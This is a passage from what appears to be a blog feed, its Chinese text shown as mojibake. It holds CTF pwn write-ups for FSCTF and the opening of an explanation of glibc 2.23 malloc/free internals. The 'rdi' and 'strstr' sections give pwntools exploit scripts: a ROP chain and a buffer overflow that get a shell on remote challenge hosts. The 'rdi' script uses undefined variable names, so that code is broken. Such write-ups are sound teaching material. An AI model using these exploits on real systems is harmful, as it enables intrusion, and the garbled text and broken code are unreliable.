çš„åœ°æ–¹å¼€å§‹å¡«å……é”®å€¼å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œå‰©ä½™éƒ¨åˆ†ç”¨éšæœºå­—ç¬¦å¡«å……ã€‚</p><p>ç¤ºä¾‹ä¸­çš„å­—å…¸è¯­å¥æ„ä¸ºï¼šä»åç§»ä¸º 0 çš„åœ°æ–¹å¡«å……æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨çš„å­—ç¬¦ï¼Œä»åç§»ä¸º 0x18 çš„åœ°æ–¹å¼€å§‹å¡«å……ä¸¤ä¸ªåœ°å€æ•°æ®ï¼Œä¸­é—´çš„éƒ¨åˆ†ç”¨éšæœºå­—ç¬¦å¡«å……ã€‚æœ€åç”± <code>flat</code> å°†ä»–ä»¬æ‰“åŒ…æˆå­—ç¬¦ä¸²ã€‚</p></blockquote><h1 id="FSCTF"><a href="#FSCTF" class="headerlink" title="FSCTF"></a>FSCTF</h1><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p><code>tac fl* &gt;&amp;2</code></p><p>è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨å¦‚ä¸‹ï¼š</p><ul><li><code>tac</code>ï¼š<code>tac</code> å‘½ä»¤ç”¨äºé¢ å€’æ–‡æœ¬æ–‡ä»¶ä¸­çš„è¡Œã€‚å®ƒä»¥ç›¸åçš„é¡ºåºæ‰“å°æ–‡ä»¶çš„è¡Œã€‚</li><li><code>fl*</code>ï¼šè¿™æ˜¯ä¸€ä¸ªé€šé…ç¬¦æ¨¡å¼ï¼Œç”¨äºåŒ¹é…å½“å‰ç›®å½•ä¸­ä»¥ â€œflâ€ å¼€å¤´çš„æ–‡ä»¶çš„åç§°ã€‚ä¾‹å¦‚ï¼Œå®ƒå¯èƒ½åŒ¹é…æ–‡ä»¶å¦‚ â€œflag.txtâ€ æˆ– â€œflag.datâ€ã€‚</li><li><code>&gt;&amp;2</code>ï¼šå‘½ä»¤çš„è¿™éƒ¨åˆ†å°†è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†é”™è¯¯ï¼ˆæ–‡ä»¶æè¿°ç¬¦ 2ï¼‰ï¼Œè€Œä¸æ˜¯æ ‡å‡†è¾“å‡ºï¼ˆæ–‡ä»¶æè¿°ç¬¦ 1ï¼‰ã€‚</li></ul><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/nc.png"></p><h3 id="rdi"><a href="#rdi" class="headerlink" title="rdi"></a>rdi</h3><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/rdi_checksec.png"></p><p>æ²¡æœ‰ canary ä¿æŠ¤å’Œ PIE ä¿æŠ¤</p><p>ä¸¢è¿› ida çœ‹çœ‹</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/rdi_read.png"></p><p>info é‡Œæ˜¯ç¨‹åºçš„ä¸¤è¡Œè¾“å…¥ï¼Œæ¥ç€å°±æ˜¯è¿™ä¸ª <code>read()</code> å‡½æ•°ï¼Œå¯ä»¥æº¢å‡ºã€‚</p><p>å¦å¤–å°±æ˜¯ gift å‡½æ•°äº†ï¼Œé‡Œé¢æœ‰ä¸ª syscall ç³»ç»Ÿè°ƒç”¨ä½†æ˜¯æ²¡æœ‰ â€œ&#x2F;bin&#x2F;shâ€ å­—ç¬¦ä¸²ï¼Œæ ¹æ®æ±‡ç¼–ä»£ç æ¨æ–­å‡ºéœ€è¦åˆ©ç”¨ rdi ä¼ å…¥å‚æ•°</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/rdi_syscall.png"></p><p>å› ä¸ºå¼€å¯äº† NX ä¿æŠ¤ï¼Œæˆ‘ä»¬ä¸å†ç›´æ¥å‘æ ˆä¸Šæ³¨å…¥ shellcode </p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/rdi_gadget.png"></p><p>é¡ºä¾¿æ‰¾ä¸€ä¸‹ â€˜&#x2F;bin&#x2F;shâ€™</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/rdi_sh.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p=process(&#x27;./rdi&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28911</span>)<br><br>rdi=<span class="hljs-number">0x04007d3</span><br>bin_sh=<span class="hljs-number">0x040080d</span><br>syscall=<span class="hljs-number">0x04006FB</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)<br><span class="hljs-comment">#å¦‚æœæº¢å‡ºé•¿åº¦å¤Ÿçš„è¯è¿˜å¯ä»¥é€šè¿‡æ³„éœ²libcåœ°å€æ‰“</span><br><span class="hljs-comment">#payload=b&#x27;a&#x27;*0x88+p64(pop_rdi)+p64(read_got)+p64(puts_plt)+p64(main)</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;ready for your answer:\n&#x27;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="strstr"><a href="#strstr" class="headerlink" title="strstr"></a>strstr</h3><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/strstr_checksec.png"></p><p>æ²¡æœ‰ canary ä¿æŠ¤å’Œ PIE ä¿æŠ¤ï¼Œå†ä¸¢è¿› ida çœ‹çœ‹</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/strstr_main.png"></p><p>mainå‡½æ•°é‡Œæœ‰ä¸ª <code>read()</code> å‡½æ•°ï¼Œä½†æ˜¯çœ‹ä¸Šå»æ²¡æœ‰æº¢å‡ºç©ºé—´</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/strstr_func.png"></p><p><code>func()</code> å‡½æ•°é‡Œæœ‰ä¸€ä¸ªå¯¹è¾“å…¥çš„å­—ç¬¦ä¸² src ä¹Ÿå°±æ˜¯ buf çš„é•¿åº¦æ£€æµ‹ï¼Œç”±äºè¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼æ˜¯ <code>strcpy(s,src)</code>ï¼Œæˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ â€˜\x00â€™ æ¥æˆªæ–­å­—ç¬¦ä¸²ã€‚ä½†è¿™ä¸ªè®°å½• src é•¿åº¦çš„ v3 æ˜¯ä¸€ä¸ªæ— ç¬¦å·çš„intå‹æ•°æ®ï¼Œå¯ä»¥é€šè¿‡æ•´æ•°æº¢å‡ºæ¥ç»•è¿‡é•¿åº¦æ£€æµ‹ã€‚</p><p>æˆ‘ä»¬å°±éœ€è¦çŸ¥é“ unsigned __int8 çš„å–å€¼èŒƒå›´æ˜¯å¤šå°‘ï¼Œæ˜¯0<del>255ï¼Œé‚£æˆ‘ä»¬å¯ä»¥è¾“å…¥å­—ç¬¦çš„é•¿åº¦å°±å¯ä»¥æ˜¯ 256</del>264ï¼Œåœ¨è¿™èŒƒå›´å†…çš„é•¿åº¦éƒ½å¯ä»¥è·å¾—shell</p><p>ç„¶åå°±æ˜¯è¿™ä¸ªåé—¨å‡½æ•°äº†</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/strstr_syscall.png"></p><p>æˆ‘ä»¬æ¥ç€æ¥è®¡ç®— offest ï¼Œæˆ‘ä»¬æ— æ³•åˆ©ç”¨ main å‡½æ•°ä¸­çš„è¿”å›åœ°å€ï¼Œåªèƒ½åˆ©ç”¨ func ä¸­çš„ <code>return strcpy()</code>ï¼Œs çš„é•¿åº¦æ˜¯ b9 ï¼Œè¦†ç›–è¿”å›åœ°å€å°±æ˜¯ b9+4ã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br> <br>p =remote(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28318</span>)<br>elf =ELF(<span class="hljs-string">&#x27;./strstr&#x27;</span>)<br> <br>backdoor =<span class="hljs-number">0x80492AF</span><br>ret_addr =<span class="hljs-number">0x804900a</span><br> <br>p.recvuntil(<span class="hljs-string">b&#x27;show me your power\n&#x27;</span>)<br> <br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0xb9</span> +<span class="hljs-number">4</span>) +p32(backdoor)<br>payload=payload.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)<br> <br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/stack_checksec.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fmt</tag>
      
      <tag>æ ˆè¿ç§»</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mallocå’Œfreeæºç åˆ†æ</title>
    <link href="/2023/12/17/malloc%E5%92%8Cfree%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2023/12/17/malloc%E5%92%8Cfree%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>libc2.23 çš„ malloc å’Œ free å‡½æ•°æºç åˆ†æ</p><span id="more"></span><p>æˆ‘ä»¬çŸ¥é“ç¨‹åºå®ƒæœ‰åŠ¨æ€åˆ†é…å†…å­˜çš„æ“ä½œï¼ŒLinux å°±æ˜¯é  malloc å’Œ free æ¥å®ç°åˆ†é…å’Œå›æ”¶çš„ã€‚</p><blockquote><p>ä¸åˆ»æ„å»è¯´æ˜éƒ½æ˜¯ç”¨ 64 ä½ç³»ç»Ÿä¸¾ä¾‹è§£é‡Šçš„</p></blockquote><h1 id="ptmalloc2-çš„åˆ†é…ç­–ç•¥"><a href="#ptmalloc2-çš„åˆ†é…ç­–ç•¥" class="headerlink" title="ptmalloc2 çš„åˆ†é…ç­–ç•¥"></a>ptmalloc2 çš„åˆ†é…ç­–ç•¥</h1><blockquote><p>ä¹‹å‰å†™å †æ¦‚è¿°çš„æ—¶å€™å†™è¿‡ä¸€æ¬¡äº†è¿™æ¬¡ç²—ç•¥æ¦‚æ‹¬ä¸€ä¸‹é¡ºä¾¿å¤ä¹ äº†</p></blockquote><h3 id="åˆ†é…"><a href="#åˆ†é…" class="headerlink" title="åˆ†é…"></a>åˆ†é…</h3><p>Linuxç³»ç»Ÿä¸­ä½¿ç”¨ ptmalloc2 ï¼Œåœ¨è¿™ä¸ªåˆ†é…è§„åˆ™ä¸‹ï¼Œ<strong>ä¸æ˜¯æ¯ä¸€æ¬¡ malloc ç¨‹åºéƒ½ä¼šå‘ç³»ç»Ÿç”³è¯·å†…å­˜ã€‚</strong></p><p>åœ¨ç¬¬ä¸€æ¬¡ <code>malloc()</code>çš„æ—¶å€™ï¼Œå®ƒä¼šå‘æ“ä½œç³»ç»Ÿç”³è¯· <code>0x21000B(132KB)</code> çš„å†…å­˜ï¼ˆå›ºå®šå€¼ä¸ä¼šå˜ï¼‰ï¼Œåç»­åˆ†é…éƒ½ä»å·²ç»ç”³è¯·çš„è¿™ä¸€å¤§å—å†…å­˜ä¸­åˆ†å‰²ï¼Œç”¨å®Œäº†æ‰ä¼šå†æ¬¡å‘ç³»ç»Ÿç”³è¯·å†…å­˜ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•å»åˆ†å‰²å—å‘¢ï¼Ÿæˆ‘ä»¬å®è·µæ—¶ä¼šå‘ç°ï¼Œå¹¶ä¸æ˜¯æˆ‘ä»¬å¸Œæœ›è·å¾—å¤šå°‘å†…å­˜ç¨‹åºå°±åˆ†å‰²ç»™æˆ‘ä»¬å¤šå°‘çš„ã€‚æ¯ä¸€ä¸ªè¢«åˆ†å‰²çš„å †å—éƒ½éœ€è¦æ ‡æ³¨å®ƒä»¬çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ˜¯å¦è¢«ä½¿ç”¨ã€å †å—å¤§å°ç­‰æ•°æ®ç‰¹å¾ï¼Œè¿™å°±å¯¼è‡´åˆ†å‰²å†…å­˜å—çš„æ—¶å€™ä¸å¯é¿å…åœ°è¦åœ¨å†…å­˜å—ä¸­é¢å¤–å¼€å‡ºä¸€éƒ¨åˆ†åŒºåŸŸç”¨äºç®¡ç†ã€‚</p><p>åŒæ—¶ç”±äºéœ€è¦ä¿è¯æŒ‡é’ˆå¯¹é½ï¼Œç³»ç»Ÿè¦æ±‚æ¯ä¸€ä¸ªå †å—éƒ½æ˜¯ <code>SIZE_SZ*2</code> çš„æ•´å€æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ <strong>32 ä½æ“ä½œç³»ç»Ÿä¸‹çš„å †å—å¤§å°å¿…é¡»æ˜¯ 8 çš„æ•´æ•°å€ï¼Œ64 ä½å¿…é¡»æ˜¯ 16 çš„æ•´æ•°å€ã€‚</strong></p><p>ä»¥32ä½æ“ä½œç³»ç»Ÿä¸ºä¾‹ï¼Œsize çš„å€¼å¿…å®šä¸º 8 çš„æ•´æ•°å€ï¼ŒäºŒè¿›åˆ¶è§’åº¦ä¸‹çœ‹æ¥ï¼Œä½ä¸‰ä½æ°¸è¿œæ˜¯0ï¼Œå¦‚æœä¸åˆ©ç”¨èµ·æ¥çš„è¯å°±æœ‰ç‚¹æµªè´¹ã€‚</p><p>å¦‚ä¸‹å›¾ï¼Œåœ¨ malloc.c ä¸­å®šä¹‰äº†ä¸‹é¢çš„éƒ¨åˆ†ï¼š</p><p><img src="/img/malloc%E5%92%8Cfree%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/%E6%A0%87%E5%BF%97%E4%BD%8D%E4%B8%8Esize.png"></p><p>è§„å®š <code>size</code> çš„ä½ä¸‰ä½ä¸ä½œä¸ºå®é™…çš„ <code>chunk</code> å¤§å°ï¼Œè€Œæ˜¯æ ‡å¿—ä½ã€‚ä¸‰ä¸ªæ ‡å¿—ä½ä»é«˜ä½åˆ°ä½ä½åˆ†åˆ«æ˜¯ï¼š</p><ol><li><strong>NON_MAIN_ARENA</strong>ï¼šæ˜¯å¦ä¸ºä¸»åˆ†é…ï¼Œ0è¡¨ç¤ºæ˜¯ä¸»åˆ†é…ï¼Œæƒå€¼ä¸º4</li><li><strong>IS_MMAPPED</strong>ï¼šè¡¨ç¤ºå†…å­˜æ˜¯å¦ä¸º <code>mmap</code> è·å¾—ï¼Œ0è¡¨ç¤ºä¸æ˜¯ï¼Œæƒå€¼ä¸º2</li><li><strong>PREV_INUSE</strong>ï¼šè¡¨ç¤ºå‰é¢ä¸€ä¸ªå†…å­˜å—æ˜¯å¦è¢«ä½¿ç”¨ï¼Œ0è¡¨ç¤ºä¸è¢«ä½¿ç”¨ï¼Œæƒå€¼ä¸º1</li></ol><p>åœ¨ 64 ä½æ“ä½œç³»ç»Ÿä¸­å°±æ˜¯ä½ 4 ä½ï¼Œå¤šå‡ºä¸€ä¸ªæ ‡å¿—ä½ï¼Œä½†æ˜¯è¿™ä¸ªæ ‡å¿—ä½å½“å‰æ— ä»»ä½•æ„ä¹‰ï¼Œä½†æ˜¯å®ƒåŒæ ·ä¸ä½œä¸º <code>chunk</code>çš„å¤§å°ã€‚</p><p>å¦‚æœæ˜¯å•å•æ»¡è¶³ <code>SIZE_SZ*2</code> çš„æ•´å€æ•°ï¼Œé‚£ä¹ˆç†è®ºä¸Šæˆ‘ä»¬åº”è¯¥æ˜¯å¯ä»¥åˆ†é… 0x10 å¤§å°çš„å †å—çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å®é™…è¿è¡Œ<code>malloc (0x10)</code> å‘ç°å †å—å¤§å°æ˜¯ 0x20ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬äº†è§£ä¸€ä¸‹chunkç»“æ„å°±èƒ½çŸ¥é“ï¼Œchunk çš„ç»“æ„ä½“æœ‰ <code>0x10</code> ä¸ªé»˜è®¤è¢«åŒ…å«åœ¨å †å—é‡Œçš„å¿…é¡»åˆ†é…çš„å­—èŠ‚ã€‚</p><h3 id="å›æ”¶"><a href="#å›æ”¶" class="headerlink" title="å›æ”¶"></a>å›æ”¶</h3><p>ç›®å‰æ¥çœ‹ï¼Œåˆ†é…å †å—çš„æ—¶å€™å®é™…ä¸Šæ“ä½œå¾ˆç®€å•ï¼Œå°±æ˜¯ä»å¤§å †å—é‡Œé¢åˆ†å‰²ä¸€å—åˆé€‚çš„å¤§å°å°±å¥½äº†ã€‚ä½†æ˜¯é‡Šæ”¾ä»¥åä¸èƒ½åƒææ©¡çš®æ³¥ä¸€æ ·å†æŠŠå®ƒæ”¾å›å»ã€‚å¦‚æœæˆ‘ä»¬æ¯ä¸€æ¬¡ free éƒ½ä¸åšå¤„ç†çš„æ“ä½œç›´æ¥ä¸¢å¼ƒï¼Œä¾‹å¦‚æˆ‘ä»¬ä¸€æ¬¡æ€§ç”³è¯·äº†å¾ˆå¤šå°çš„å †å—å¹¶é‡Šæ”¾ï¼Œåªæœ‰å†ä¸‹æ¬¡ç”³è¯·åŒæ ·å †å—æ‰ä¼šè¢«åˆ©ç”¨ï¼Œå¦‚æœæˆ‘ä»¬ä¸å†åˆ†é…åŒæ ·çš„å°å †å—ï¼Œè¿™å—åŒºåŸŸå°±ä¼šè¢«æµªè´¹ã€‚</p><p>è¿™æ—¶æˆ‘ä»¬è¦äº†è§£ä¸€ä¸‹ ptmalloc çš„åˆä¸€ä¸ªç­–ç•¥ï¼š<strong>å°½é‡åˆå¹¶ç‰©ç†ç›¸é‚»çš„ç©ºé—²å †å—</strong>ã€‚å°±æ˜¯å›æ”¶æ—¶ï¼Œå¯ä»¥æŠŠç›¸é‚»çš„å°å †å—åˆå¹¶æˆå¤§å †å—ã€‚åœ¨åˆå¹¶çš„æ—¶å€™æˆ‘å¯èƒ½å‰é¢ä¼šæœ‰ <code>free</code> çš„å†…å­˜å—ï¼Œåé¢ä¹Ÿä¼šæœ‰ <code>free</code> çš„å†…å­˜å—ã€‚</p><p>é‚£ä¹ˆæˆ‘æ€ä¹ˆåœ¨åªçŸ¥é“æˆ‘è‡ªèº«ä¿¡æ¯çš„æƒ…å†µä¸‹å‡†ç¡®æ‰¾åˆ°å‰åçš„ <code>chunk</code> å…·ä½“åœ¨å“ªå‘¢ï¼Ÿ</p><p>è¿™æ—¶éœ€è¦æŠŠ malloc_chunk ç»“æ„ä½“æ‹ä¸Šæ¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>é€šè¿‡ <code>prev_size</code> ä½æˆ‘ä»¬ä¸ä»…å¯ä»¥å¾—çŸ¥å‰ä¸€ä¸ª <code>chunk</code> æœ‰æ²¡æœ‰è¢« <code>free</code> ï¼Œè¿˜å¯ä»¥å¾—çŸ¥ <code>chunk</code> çš„å¤§å°ã€‚æ‰€ä»¥åœ¨ä¸€ä¸ª <code>chunk</code> çš„ç»“æ„ä½“å†…ï¼Œåœ¨ size ä¹‹å‰è¿˜ä¼šæœ‰ä¸€ä¸ª <code>prev_size</code> ã€‚</p><p>åœ¨ç¨‹åºä½¿ç”¨æ—¶ï¼Œ<code>fd</code>ã€<code>bk</code> ç­‰æŒ‡é’ˆå¯ä»¥ç»™ç”¨æˆ·å†™æ•°æ®ï¼Œåªæœ‰è¢«é‡Šæ”¾çš„æ—¶å€™æ‰ä¼šå­˜å‚¨æŒ‡é’ˆæ•°æ®ã€‚</p><p>æ‰€ä»¥ <code>prev_size</code> å’Œ <code>size</code> ä¸¤ä¸ªæ•°æ®å°±å äº† 0x10 çš„ç©ºé—´ï¼Œè¿™ä¹Ÿå°±æ˜¯æœ€å°å †å—æ˜¯ 0x20 çš„åŸå› ã€‚</p><h3 id="è¯¦ç»†çš„å›æ”¶å¤„ç†"><a href="#è¯¦ç»†çš„å›æ”¶å¤„ç†" class="headerlink" title="è¯¦ç»†çš„å›æ”¶å¤„ç†"></a>è¯¦ç»†çš„å›æ”¶å¤„ç†</h3><p>bin å°±æ˜¯ç©ºé—² chunk çš„åˆ«åï¼Œæˆ‘ä»¬ä½¿ç”¨é“¾è¡¨ç»“æ„æ¥ç®¡ç†ç©ºé—²å †å—ï¼Œæˆ‘ä»¬è¯´çš„ bin ä¹ŸæŒ‡ä»£ä¸åŒçš„é“¾è¡¨è¡¨å¤´ã€‚</p><h5 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h5><p>0x20~0x80 å¤§å°çš„ chunkï¼Œæˆ‘ä»¬ä¼šæŠŠå®ƒæ‰”è¿› <code>fast bin</code> ã€‚</p><p><code>fast bin</code> ç®¡ç† free_chunk é‡‡ç”¨<strong>å•é“¾è¡¨</strong>æ–¹å¼ï¼Œå¹¶ä¸”ç¬¦åˆ<strong>å…ˆè¿›åå‡ºï¼ˆFILOï¼‰</strong>çš„åŸåˆ™ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">p1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>p2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">free</span>(p1);<br><span class="hljs-built_in">free</span>(p2);<br>p3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>p4=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br></code></pre></td></tr></table></figure><p>æœ€å <code>p3</code> çš„æŒ‡é’ˆæ˜¯åŸæœ¬æŒ‡å‘ <code>p2</code> çš„æŒ‡é’ˆï¼Œ<code>p4</code> çš„æŒ‡é’ˆæ˜¯åŸæœ¬æŒ‡å‘ <code>p1</code>çš„æŒ‡é’ˆã€‚</p><p>å¹¶ä¸”æ‰€æœ‰ <code>fast bin</code> ä¹‹åçš„ chunk çš„ <code>prev_inuse</code> ä½æ°¸è¿œä¸º 1 ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒæ°¸è¿œè¢«è§†ä¸ºåœ¨ä½¿ç”¨ä¸­ã€‚ç”±äºè¿™ä¸ªä½ç”¨äºåˆå¹¶ç›¸é‚»å †å—ï¼Œæ‰€ä»¥ <code>fast bin</code> ä¸ä¼šè¢«åˆå¹¶ï¼Œfree æ‰çš„æ—¶å€™æ˜¯å¤šå¤§å°±æ˜¯å¤šå¤§ã€‚æ¯”å¦‚æˆ‘ä»¬å½“å‰ <code>fast bin</code> ä¸­åªæœ‰ 0x20 å’Œ 0x30 çš„å †å—ï¼Œæˆ‘ä»¬æ–°ç”³è¯·ä¸€ä¸ª 0x50 çš„å †å—ï¼Œæ£€æŸ¥ <code>fastbin</code> ä¸­æ²¡æœ‰å°±æ˜¯æ²¡æœ‰ï¼Œä¸ä¼šå»åˆå¹¶ 0x20 å’Œ 0x30 çš„ä¸¤ä¸ªå †å—æ¥æ‹¼ 0x50 ï¼Œä¹Ÿä¸ä¼šåˆ‡å‰²æŸä¸ªå †å—ã€‚</p><blockquote><p>å…¶ä»–çš„éƒ½ä¼šå‚ä¸åˆ‡å‰²ä¸åˆå¹¶</p></blockquote><h5 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h5><p>è¢«é‡Šæ”¾çš„ free_chunkï¼Œç»æ£€æŸ¥ä¸å±äº <code>fast bin</code> ä¹‹åä¼šè¢«ä¸¢è¿› <code>unsorted bin</code>ã€‚</p><p><code>unsorted bin</code> æ˜¯åŒå‘é“¾è¡¨ç»“æ„ï¼Œä¹Ÿå°±æ˜¯è¯´ <code>unsorted bin</code> ä¸­æœ‰ä¸¤ä¸ª â€å¤´æŒ‡é’ˆâ€œ ï¼Œæˆ‘ä»¬ä¹ŸæŠŠå¤´éƒ¨çš„ä¸¤ä¸ª bin çœ‹ä½œ chunkã€‚åˆå§‹çŠ¶æ€æ—¶ï¼Œ<code>unsorted bin</code> ä¸­æ²¡æœ‰ç©ºé—² chunkï¼Œæ­¤æ—¶ä¸¤ä¸ª bins çš„çš„ <code>fd</code> å’Œ <code>bk</code> éƒ½æŒ‡å‘è‡ªèº«çš„ <code>prev_size</code> ã€‚</p><p><code>unsorted bin</code> ä¸­ chunk å¤§å°ä¸ä¸€å®šç›¸ç­‰ä¸”æ— åºæ’åˆ—ã€‚</p><p>å½“éœ€è¦æ£€æŸ¥ <code>unsorted bin</code> çš„æ—¶å€™ï¼Œä¼šéå†æ•´ä¸ªé“¾è¡¨ï¼Œå¯»æ‰¾ç¬¬ä¸€ä¸ªèƒ½æ»¡è¶³çš„ chunk å¤§å°åˆ‡å‰²ã€‚å½“ç„¶è¿™ä¸­æ¡ä»¶çš„åˆ†å‰²ä¹Ÿæ˜¯åŸºäºæœ€å° 0x20 å¤§å°çš„åŸºç¡€ä¸Šçš„ã€‚</p><h5 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h5><p><code>small bin</code> ä¸€å…±æœ‰ 62 ä¸ªï¼Œå®ƒè¡¨ç¤ºçš„èŒƒå›´å°±æ˜¯<code>4*SIZE_SZ~126*SIZE_SZ</code>ã€‚</p><p>æŒ‰ç…§ä¸åŒçš„å¤§å°èŒƒå›´åŒºåˆ†æˆä¸åŒçš„é“¾ã€‚å½“ä¸­æ¯ä¸ª chunk çš„å¤§å°ä¸å…¶æ‰€åœ¨çš„ bin çš„ index çš„å…³ç³»ä¸ºï¼š<code>chunk_size = 2 * SIZE_SZ *index</code>ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><table><thead><tr><th>ä¸‹æ ‡</th><th>2</th><th>3</th><th>4</th><th>5</th><th>x</th><th>63</th></tr></thead><tbody><tr><td>SIZE_SZ&#x3D;4ï¼ˆ32 ä½ï¼‰</td><td>16</td><td>24</td><td>32</td><td>40</td><td>2<em>4</em>x</td><td>504</td></tr><tr><td>SIZE_SZ&#x3D;8ï¼ˆ64 ä½ï¼‰</td><td>32</td><td>48</td><td>64</td><td>80</td><td>2<em>8</em>x</td><td>1008</td></tr></tbody></table><p><code>small bins</code> é‡‡ç”¨<strong>åŒå‘é“¾è¡¨</strong>å¯¹ bin è¿›è¡Œç®¡ç†ï¼Œæ¯ä¸ªé“¾è¡¨ä¸­å­˜å‚¨çš„ chunk å¤§å°éƒ½ä¸€è‡´ã€‚</p><p>é“¾è¡¨é‡‡ç”¨ FIFO 